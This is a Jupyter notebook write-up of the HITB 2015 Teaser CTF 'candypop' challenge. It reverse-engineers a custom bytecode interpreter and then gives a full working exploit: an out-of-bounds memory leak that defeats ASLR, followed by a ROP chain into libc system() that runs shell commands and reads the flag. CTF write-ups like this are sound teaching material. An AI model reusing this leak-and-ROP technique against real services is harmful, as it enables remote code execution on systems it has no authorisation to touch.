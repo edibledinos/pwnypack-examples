{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Introduction\n",
    "\n",
    "This is a write-up of the pwn1000 challenge (candypop) of the HITB 2015 Teaser CTF. Here's the original description of the challenge:\n",
    "\n",
    "> We got backdoor access to an old candy vending machine, however we havent\n",
    "> been able to escalate privileges to the underlying operating system yet. The\n",
    "> candy machine is said to be using a strange obscure and minimal architecture.\n",
    "> Can you help us get access? We need to get ahold of the copious amounts of\n",
    "> KitKat & Snickers A.S.A.P.\n",
    "\n",
    "> We conveniently made the backdoor accessible over TCP/IP, it can be reached at\n",
    "> 52.16.33.218:22226. Furthermore, we managed to bribe an old employee of the\n",
    "> manufacturer (that is now defunct) of the vending machine to send us a copy of\n",
    "> a binary.. but we can't make heads or tails out of it. HELP!\n",
    "\n",
    "Download the binary: [candypop](candypop). TL;DR: download the [exploit](candypwn.py)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "Let's start by defining a way to connect to the candy machine."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true,
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "def connection_factory():\n",
    "    # Connect to the candy machine (no longer available)\n",
    "    # return Flow.connect_tcp('52.16.33.218', 22226)\n",
    "\n",
    "    # If you want to use the local executable, use:\n",
    "    return Flow.execute('./candypop')\n",
    "\n",
    "    # Or, via ssh (I've got a virtual machine set up for this):\n",
    "    #return Flow.execute_ssh('./candypop', '127.0.0.1', 2224)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "Let's see what kind of treat we got!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": false,
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "RELRO    CANARY  NX   PIE  RPATH  RUNPATH  FORTIFIED  PATH\n",
      "Partial  Yes     Yes  Yes  No     No           0/4/4  candypop\n"
     ]
    }
   ],
   "source": [
    "%checksec candypop"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": false,
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Herro.\n",
      "INPUT PROGRAM:\n",
      "READ 12 BYTEZ..\n",
      "\n"
     ]
    }
   ],
   "source": [
    "f = connection_factory()\n",
    "f.writeline(b'hello world')\n",
    "print(f.read_eof())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "So probably a virtual machine, interpreter or sandbox with ASLR enabled, a non-executable stack and stack canaries in place. We know nothing about what kind of program it accepts though.\n",
    "\n",
    "Let's see if we can identify the remote system:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": false,
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2\r\n"
     ]
    }
   ],
   "source": [
    "!strings candypop|grep GCC"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "Google shows us this GCC version is used on Ubuntu Trusty Tahr. So fire up a VM that runs that, we'll continue from inside the VM.\n",
    "\n",
    "## Disassembly\n",
    "\n",
    "Let's have a look at the disassembly. The program is stripped, so have a look at the entrypoint to discover the address of the main function, it's 0x1235. Looking at that function you'll notice the following things:\n",
    "\n",
    "- It sets up 0x4030 bytes of stack space.\n",
    "- It outputs the banner.\n",
    "- Reads up to 0x4000 bytes from stdin to rbp-0x4010 and stores how many bytes were read to rbp-0x4014.\n",
    "- It outputs how many bytes were read.\n",
    "- If it didn't read anything, it'll print an error.\n",
    "- If it did read something, it calls 0x10f5 providing two arguments: the buffer and the program length.\n",
    "- Either way it prints '** DONE' and returns.\n",
    "\n",
    "The function at 0x10f5 prepares a buffer, initialises it and calls another function:\n",
    "\n",
    "- It sets up 0x4030 bytes of stack space.\n",
    "- It stores the pointer to the program at rbp-0x4028 and the length at rbp-0x402c.\n",
    "- It calls a function at 0xac5 with rbp-0x4020 as argument.\n",
    "- It copies the program from the provider buffer to rbp-0x4020.\n",
    "- It calls a function at 0xb32 with rbp-0x4020 as only argument.\n",
    "\n",
    "The function at 0xac5 initialises the provided buffer:\n",
    "\n",
    "- It sets the first 9 shorts at offset 0x4000 to 0 (the first 7 in a loop, the last 2 explicitly).\n",
    "- It sets the first 0x4000 to 0 using memset.\n",
    "\n",
    "So the structure of this buffer is probably something like:\n",
    "\n",
    "    struct {\n",
    "        char a[4000];\n",
    "        short b[7];\n",
    "        short c;\n",
    "        short d;\n",
    "    }\n",
    "\n",
    "Now we get to the really interesting part. The function at 0xb32 seems to be the main interpreter:\n",
    "\n",
    "- It stores the pointer to the buffer.a member to rbp-0x10.\n",
    "- It stores the pointer to the buffer.b member to rbp-0x08.\n",
    "- It loops while buffer.d > 0 increasing d by 1 and buffer.c by 4 each iteration.\n",
    "- Each iteration loads the byte at buffer.a[buffer.c + 1] into rbp-0x18 and a short encoded in big endian at buffer.b[buffer.c + {2,3}] into rbp-0x14.\n",
    "- It then performs a switch on buffer.b[buffer.c] and executes some instruction based on that.\n",
    "\n",
    "Okay, so now we can say something about the interpreter. It's a virtual machine where each operation consists of an opcode, an 8 bit argument and a 16 bit argument. Buffer.c is the program counter, buffer.d keeps track of how many instruction have been executed. Looking at the disassembly of the actual opcodes, the buffer.b seems to be the memory of the virtual machine.\n",
    "\n",
    "That buffer, is not just a buffer but describes the virtual machine state:\n",
    "\n",
    "    typedef struct {\n",
    "        unsigned char opcode;\n",
    "        unsigned char arg1;\n",
    "        unsigned short arg2;  // not really a short as it's big endian.\n",
    "    } opcode;\n",
    "\n",
    "    struct {\n",
    "        opcode opcodes[1000];\n",
    "        short mem[7];\n",
    "        short pc;  // program counter\n",
    "        short ic;  // executed instructions counter\n",
    "    }\n",
    "\n",
    "After closer analysis, the individual opcodes map out like this:\n",
    "\n",
    "    opcode | function\n",
    "    -------|------------------------------\n",
    "    0x10   | mem[arg1] = arg2\n",
    "    0x11   | mem[arg1] = mem[arg2]\n",
    "    0x12   | mem[arg1] ^= arg2\n",
    "    0x30   | mem[arg1] <<= arg2\n",
    "    0x31   | mem[arg1] >>= arg2\n",
    "    0x40   | mem[arg1] += arg2\n",
    "    0x41   | mem[arg1] += mem[arg2]\n",
    "    0x49   | mem[arg1] |= arg2\n",
    "    0x50   | mem[arg1] &= arg2\n",
    "    0x51   | mem[arg1] &= & mem[arg2]\n",
    "    0x60   | flag = mem[arg1] == arg2\n",
    "    0x61   | flag = mem[arg1] == mem[arg2]\n",
    "    0xa5   | printf(\"%04x\\n\", mem[arg1])\n",
    "    0xa6   | putchar(0x0a)\n",
    "    0xbb   | if(flag == 1) jump arg2\n",
    "    0xbc   | jump arg2\n",
    "    0xc0   | exit(-1)\n",
    "    0xde   | return 0\n",
    "    0xfe   | read(program + 0x3f00, 0x100)\n",
    "\n",
    "Now, with all functionality mapped, what can we do to break it?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploitation\n",
    "\n",
    "When accessing the memory, arg1 and arg2 aren't bounds checked so let's see if we can see anything interesting from the stack. We create a program for the interpreter that leaks everything from mem[10] to mem[255] and then calls the 0xfe opcode (which we can easily catch in gdb by catching the read syscall).\n",
    "\n",
    "Firstly, lets create a function that can pack a series of candy machine commands."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": true,
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "# Function to pack a series of candypop VM commands\n",
    "def build(c):\n",
    "    return pack('>' + 'BBH' * (len(c) // 3), *c)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now, let's see what kind of data we can leak by writing a pre-compiled program to disk."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "# Create the program that leaks the memory.\n",
    "program = []\n",
    "for i in range(10, 256):\n",
    "    program.extend([\n",
    "        0xa5, i, 0,\n",
    "    ])\n",
    "\n",
    "# Change True to False to connect to the candy machine directly instead of dropping a pre-compiled program.\n",
    "if True:\n",
    "    # Our pre-compiled program also issues the read instruction.\n",
    "    program.extend([0xfe, 0, 0])\n",
    "    with open('candyflood', 'wb') as f:\n",
    "        f.write(build(program))\n",
    "else:\n",
    "    f = connection_factory()\n",
    "    f.until(b'INPUT PROGRAM:\\n')\n",
    "    f.write(build(program))\n",
    "\n",
    "    # Read the output.\n",
    "    f.read_eof(echo=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "Feeding that to the remote service using netcat (nc 52.16.33.218 22226 < candyflood) shows something along the lines of:\n",
    "\n",
    "    Herro.\n",
    "    INPUT PROGRAM:\n",
    "    READ 92 BYTEZ..\n",
    "    7fff\n",
    "    0000\n",
    "    2f52\n",
    "    f7a8\n",
    "    7fff\n",
    "    0000\n",
    "    e440\n",
    "    ffff\n",
    "    7fff\n",
    "    0000\n",
    "    52fa\n",
    "    5555\n",
    "    5555\n",
    "    0000\n",
    "    e528\n",
    "    ffff\n",
    "    7fff\n",
    "    0000\n",
    "    0000\n",
    "    0000\n",
    "    0001\n",
    "    0000\n",
    "    ...\n",
    "\n",
    "This example is actually the output from a gdb session and not the remote server, but that doesn't really matter. The lines 4 and 5 are part of an address but the address is incomplete, lines 6-9, 10-13 and 14-17 make up addresses. If you run it a second time, you'll notice the addresses have changed. ASLR is enabled.\n",
    "\n",
    "Let's run it in gdb and see what we find. We catch syscall read before we run the program and keep continuing until we're returned to gdb after the memory has been dumped.\n",
    "\n",
    "Use info proc mappings to discover which section holds the first address (0x00007ffff7a82f52). It's in libc.so, at an offset of 0x6df52 from the beginning of the mapped region. We can use this to calculate the address of the system() function.\n",
    "\n",
    "The second address (0x00007fffffffe440) is a stack address, it's actually the stored frame pointer of the main function. Since we caught the read syscall, we have the address of the secondary read buffer (buffer.opcodes + 0x3f00) in the rsi register. The offset between the leaked address and the read buffer is 0x4160 bytes.\n",
    "\n",
    "The third address (0x00005555555552fa) is the return address for the function at 0x10f5 and points to inside the main function.\n",
    "\n",
    "Now we have everything we need to craft a solution: a way to leak a pointer to the stack and to libc, an overwritable return pointer and a way to run a second program which can exploit those conditions after leaking the addresses."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "## Solution\n",
    "\n",
    "After collecting all the data, I used pwnypack to write a script that leaks the libc and stack address, calculates the base addresses of libc and the second phase read buffer. It then locates a pop rdi; ret gadget inside libc, looks up the address of the system() call and sets up the ROP chain for a command provided on the commandline.\n",
    "\n",
    "Let's set up the base environment and get the required information from the binaries:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "collapsed": false,
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "# Assume the target of the candypop binary.\n",
    "target.assume(ELF('candypop'))\n",
    "\n",
    "# Load libc.so from ubuntu trusty tahr. Note: the libc.so version was deduced\n",
    "# from the gcc signature in the candypop binary.\n",
    "libc = ELF('candypop-libc.so')\n",
    "\n",
    "# Get the offset of the system call within libc.\n",
    "SYSTEM_ADDR = libc.get_symbol('system').value\n",
    "\n",
    "# Find the offset of a suitable gadget.\n",
    "GADGET_ADDR = find_gadget(libc, asm('pop rdi\\nret'))[0]['addr']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "Next, we define a helper function to pack machine code ops for the candy machine."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "Our stage 1 program tells the candy machine to print an element to get the stack prepared. Then we leak the libc address and the stack address. After that we'll tell the machine to load our stage 2 program."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "collapsed": true,
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "# Stage 1: leak addresses, initiate read.\n",
    "def build_stage1():\n",
    "    return build([\n",
    "        # Write something to get required addresses on stack.\n",
    "        0xa5, 0, 0,\n",
    "\n",
    "        # Leak address inside libc.\n",
    "        0xa5, 15, 0,\n",
    "        0xa5, 14, 0,\n",
    "        0xa5, 13, 0,\n",
    "        0xa5, 12, 0,\n",
    "\n",
    "        # Leak stack address.\n",
    "        0xa5, 19, 0,\n",
    "        0xa5, 18, 0,\n",
    "        0xa5, 17, 0,\n",
    "        0xa5, 16, 0,\n",
    "\n",
    "        # Tell candy machine to read more data.\n",
    "        0xfe, 0,  0,\n",
    "    ])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "We then create a function that takes the tuples of the leaked addresses and turns them into the relevant base addresses."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "collapsed": true,
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "# Parse a sequence of address parts to an address.\n",
    "def parse_addr(c):\n",
    "    return int(b''.join(c), 16)\n",
    "\n",
    "# Parse leaked addresses, rebase to libc base and read buffer addresses.\n",
    "def parse_addrs(data):\n",
    "    libc_base = parse_addr(data[0:4]) - 0x6df52\n",
    "    read_buffer = parse_addr(data[4:9]) - 0x4160\n",
    "    return libc_base, read_buffer"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "Our stage 2 function takes the libc base address and the address of the read buffer and sets up a ROP chain. The chain will start with the pop rdi; ret gadget, which pops the address of the argument to the system call into rdi and then returns to the libc system() function."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "collapsed": true,
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "def build_stage2(libc_base, read_buffer):\n",
    "    gadget_addr = libc_base + GADGET_ADDR\n",
    "    system_addr = libc_base + SYSTEM_ADDR\n",
    "    system_arg = read_buffer + 52  # 52 = length of secondary program: 13 ops * 4 bytes.\n",
    "    return build([\n",
    "        # Write address of gadget (pop rdi; ret) to RP.\n",
    "        0x10, 23, (gadget_addr >> 48) & 0xffff,\n",
    "        0x10, 22, (gadget_addr >> 32) & 0xffff,\n",
    "        0x10, 21, (gadget_addr >> 16) & 0xffff,\n",
    "        0x10, 20, (gadget_addr >>  0) & 0xffff,\n",
    "\n",
    "        # Write address of argument to system to RP+8.\n",
    "        0x10, 27, (system_arg >> 48) & 0xffff,\n",
    "        0x10, 26, (system_arg >> 32) & 0xffff,\n",
    "        0x10, 25, (system_arg >> 16) & 0xffff,\n",
    "        0x10, 24, (system_arg >>  0) & 0xffff,\n",
    "\n",
    "        # Write address of system() to RP+16.\n",
    "        0x10, 31, (system_addr >> 48) & 0xffff,\n",
    "        0x10, 30, (system_addr >> 32) & 0xffff,\n",
    "        0x10, 29, (system_addr >> 16) & 0xffff,\n",
    "        0x10, 28, (system_addr >>  0) & 0xffff,\n",
    "\n",
    "        # Return.\n",
    "        0xde, 0, 0,\n",
    "    ])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "All we need now is a function that connects to the candy machine, and implements some flow control:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "collapsed": true,
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "def candypop(system_cmd):\n",
    "    # Connect to the candy machine.\n",
    "    f = connection_factory()\n",
    "\n",
    "    # Consume initial output.\n",
    "    f.until(b'INPUT PROGRAM:\\n')\n",
    "\n",
    "    # Phase 1, leak addresses, initiate read.\n",
    "    f.write(build_stage1(), echo=False)\n",
    "    # Consume uninteresting output.\n",
    "    f.until(b'0000\\n')\n",
    "    \n",
    "    # Get the interesting bits.\n",
    "    data = [l.strip() for l in f.readlines(8)]\n",
    "\n",
    "    # Parse output and calculate relevant base addresses.\n",
    "    libc_base, read_buffer = parse_addrs(data)\n",
    "\n",
    "    # Send the secondary program.\n",
    "    f.write(build_stage2(libc_base, read_buffer) + system_cmd, echo=False)\n",
    "\n",
    "    f.read_eof(echo=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "Now, we can use this function to execute commands on the remote system:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "collapsed": false,
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "candyflood\n",
      "candyflood.py\n",
      "candypop\n",
      "candypop.ipynb\n",
      "candypop-libc.so\n",
      "candypwn.py\n",
      "YOU_WANT_THIS\n"
     ]
    }
   ],
   "source": [
    "candypop(b'ls')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HITB{8b7b9241c9282e9a982378f73d648781}\n"
     ]
    }
   ],
   "source": [
    "candypop(b'cat YOU_WANT_THIS')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "pwnypack (Python 2)",
   "language": "python",
   "name": "pwnypack"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
